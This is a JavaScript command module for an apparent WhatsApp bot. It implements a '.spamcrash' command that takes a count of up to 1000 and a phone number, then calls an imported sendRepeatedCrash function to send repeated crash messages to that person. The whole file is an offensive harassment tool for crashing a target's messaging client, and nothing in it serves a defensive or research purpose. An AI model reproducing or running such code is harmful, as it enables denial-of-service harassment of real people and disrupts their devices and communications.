const { sendRepeatedCrash } = require('../lib/bugfunctions');
const {
  normalizeNumber,
  getText,
  toJid
} = require('../Utils/helper');

async function spamcrashCommand(sock, chatId, message) {
  try {
    // ❌ block group chats
    if (chatId.endsWith('@g.us')) {
      return sock.sendMessage(chatId, {
        text: '❌ This command works only in private chat'
      }, { quoted: message });
    }

    // ❌ allow ONLY bot account (you)
    if (!message.key.fromMe) {
      return sock.sendMessage(chatId, {
        text: '❌ This command is for premium users only'
      }, { quoted: message });
    }

    // ✅ get message text
    const text = getText(message);
    const args = text.trim().split(/\s+/);

    const count = parseInt(args[1]);
    let number = normalizeNumber(args[2]);

    // ❌ invalid usage
    if (!count || !number) {
      return sock.sendMessage(chatId, {
        text: '❌ Usage: .spamcrash 5 2547xxxxxxx'
      }, { quoted: message });
    }

    // optional safety limit
    if (count > 1000) {
      return sock.sendMessage(chatId, {
        text: '❌ Max 1000 allowed'
      }, { quoted: message });
    }

    const target = toJid(number);

    await sock.sendMessage(chatId, {
      text: `⏳ Sending ${count} crashes to ${number}...`
    }, { quoted: message });

    await sendRepeatedCrash(sock, target, count);

    await sock.sendMessage(chatId, {
      text: `✅ Done sending ${count} crashes`
    }, { quoted: message });

  } catch (e) {
    console.error("SPAMCRASH ERROR:", e);

    await sock.sendMessage(chatId, {
      text: '❌ Error occurred'
    }, { quoted: message }).catch(() => {});
  }
}

module.exports = spamcrashCommand;
